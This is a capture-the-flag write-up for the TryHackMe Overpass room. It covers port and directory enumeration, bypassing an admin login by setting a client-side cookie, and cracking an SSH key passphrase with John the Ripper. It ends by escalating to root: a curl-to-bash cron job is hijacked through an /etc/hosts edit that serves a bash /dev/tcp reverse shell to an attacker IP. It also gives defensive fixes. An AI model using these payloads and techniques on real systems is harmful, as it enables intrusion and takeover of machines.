# thm: Overpass ctf

https://tryhackme.com/room/overpass

## Enumeration
The first step is to perform basic enumeration using Nmap.
```
$ nmap <target ip>
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 67.77 seconds
```

The Nmap scan output indicates that a web server is running on the target system.
```
$ gobuster -u http://<target ip> -w Downloads/wordlists/common.txt 
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
/aboutus (Status: 301)
/admin (Status: 301)
/css (Status: 301)
/downloads (Status: 301)
/img (Status: 301)
/index.html (Status: 301)
/render/https://www.google.com (Status: 301)
=====================================================
```
After performing web directory enumeration, a /admin page was discovered.

The source code of the admin panel includes several JavaScript files, with login.js being of particular interest.

### login.js
```
async function postData(url = '', data = {}) {
    // Default options are marked with *
    const response = await fetch(url, {
        method: 'POST', // *GET, POST, PUT, DELETE, etc.
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *client
        body: encodeFormData(data) // body data type must match "Content-Type" header
    });
    return response; // We don't always want JSON back
}
const encodeFormData = (data) => {
    return Object.keys(data)
        .map(key => encodeURIComponent(key) + '=' + encodeURIComponent(data[key]))
        .join('&');
}
function onLoad() {
    document.querySelector("#loginForm").addEventListener("submit", function (event) {
        //on pressing enter
        event.preventDefault()
        login()
    });
}
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

Take a close look at the `login()` function which transmits the user-provided username and password to the **/api/login endpoint**. The server response is then stored in a cookie named `SessionToken`.

This endpoint is vulnerable to a weakness listed in the **OWASP Top 10 and Broken Access Control** is a likely candidate.

## Exploitation

### Broken Access Control
**Broken Access Control** is a type of security vulnerability where an application fails to properly enforce restrictions on what authenticated or unauthenticated users can do. In other words, users can perform actions or access resources that should be restricted.

```
if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
```

If the server just checks the presence of SessionToken in the cookie for admin access, anyone could manually set a cookie with any value and access /admin.

Using the browser’s developer console, it was possible to override the `SessionToken` cookie by executing following and reload the page.
```
Cookies.set("SessionToken", "AnyValue")
```
This demonstrates that the application does not properly validate session tokens, allowing unauthorized access by simply setting an arbitrary token value.

In this case, the Broken Access Control vulnerability occurs because the application trusts a client-controlled cookie (SessionToken) to authorize access to /admin. To prevent it, focus on **server-side enforcement** and **secure session** handling:

### Enforce Server-Side Authorization
Every request to /admin (or other sensitive endpoints) must check the user’s role or permissions on the server.

Example:
```
if user.role != 'admin':
    return 403  # Forbidden
```

### Secure Session Management

Set cookies so that JavaScript cannot access them:
```
Set-Cookie: SessionToken=<value>; HttpOnly; Secure; SameSite=Strict
```
- HttpOnly: it prevents JS from reading or modifying the cookie.
- Secure: it ensures the cookie is only sent over HTTPS.
- SameSite=Strict: this limits cross-site requests.

---

This led to an administrator panel, where both a username and the corresponding private SSH key for that james were accessible.

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

[REDACTED]
-----END RSA PRIVATE KEY-----
```
Copy the private SSH key to a local file and set the appropriate permissions to secure it.
```
$ ssh james@<target ip> -i id_rsa
Enter passphrase for key 'id_rsa': 
```

Although the key was protected by a passphrase, `ssh2john.py` was used to convert the key into a format compatible with **John the Ripper**. Using this converted hash, the passphrase was successfully cracked.

```
$ python2 ~/Downloads/john/run/ssh2john.py id_rsa > id_rsa.hash
$ ~/Downloads/john/run/john id_rsa.hash --wordlist=~/Download/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cracked 1 password hash, use "--show"
No password hashes left to crack (see FAQ)
$ ~/Downloads/john/run/john id_ras.hash --show
id_rsa:james13

1 password hash cracked, 0 left
```

Use the provided credentials to log in via SSH as the user james.

```
$ ssh james@<target ip> -i id_rsa
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)
james@overpass-prod:~$ 
```

Access the system to locate and read the user.txt file.

```
james@overpass-prod:~$ ls
todo.txt  user.txt
james@overpass-prod:~$ cat user.txt
thm{[REDACTED]}
```
## Privilege Escalatiopn

Next, upload lineas.sh from attacker's machine via Python Simple HTTP Server and execute it.

```
$ ls 
linpeas.sh 
$ python3 -m http.server 8888
```

```
james@overpass-prod:~$ wget http://<attacker ip>:8888/linpeas.sh
Connecting to <attacker ip>:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 847815 (828K) [text/x-sh]
Saving to: ‘linpeas.sh’
james@overpass-prod:~$ chmod +x linpeas.sh
james@overpass-prod:~$ ./linpeas.sh
```

### linpeas.sh output
```
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

The output of `linpeas.sh` shows that cron job runs as the root user, fetching the script located at `overpass.thm/downloads/src/buildscript.sh` via `curl` and immediately executing it with `bash`. This behavior is dangerous because it allows automatic execution of remote scripts with **root privileges**, which can be a significant security risk.

### Local DNS Override via /etc/hosts

If `/etc/hosts` file was modified to map `overpass.thm` to the attacker’s IP address, then this locally overrides DNS resolution, directing requests for `overpass.thm` to the attacker-controlled server. By doing so, the target system retrieves files from the intended location on the attacker machine, enabling further exploitation.

### Step 1: Directory Simulation

On attacker's machine, create the directory `/downloads/src/` and add the file `buildscript.sh` so that the HTTP server can serve it correctly, preventing 404 errors.

```
$ mkdir downloads/src
$ touch downloads/src/buildscript.sh
```

### Step 2: Reverse Shell Setup

Add a TCP reverse shell to buildscript.sh to allow the target system to connect back to the listener for remote command execution.

```
$ cat downloads/src/buildscript.sh 
bash -i >& /dev/tcp/<attacker ip>/4444 0>&1
```

### Step 3: Local Python Server Setup

Configure a Python HTTP server to serve `buildscript.sh` under `/downloads/src/`, simulating the expected target directory structure.

```
$ sudo python3 -m http.server 80
```

### Step 4: Hosts File Modification

Upload the `/etc/hosts` file to map `overpass.thm` to the local machine’s IP address. 

The `/etc/hosts` file is a local configuration file that maps hostnames to IP addresses. When a system tries to access a hostname, it first checks `/etc/hosts` before querying DNS. Updating this file allows overriding DNS resolution, directing specific hostnames to chosen IP addresses.

```
james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
james@overpass-prod:~$ nano /etc/hosts
james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
<attacker ip> overpass.thm
```

### Step 5: Setting up Netcat

Set up a Netcat listener on port 4444 to receive an incoming connection, which provides a root shell upon successful connection.
```
$ nc -lnvp 4444
```
Wait for the cron job to execute `curl overpass.thm/downloads/src/buildscript.sh` and pipe it to `bash`, which establishes a Netcat connection and provides a root shell to the listener.
```
Listening on 0.0.0.0 4444
root@overpass-prod:~# ls
ls
buildStatus
builds
go
root.txt
src
root@overpass-prod:~# cat root.txt
cat root.txt
thm{[REDACTED]}
```
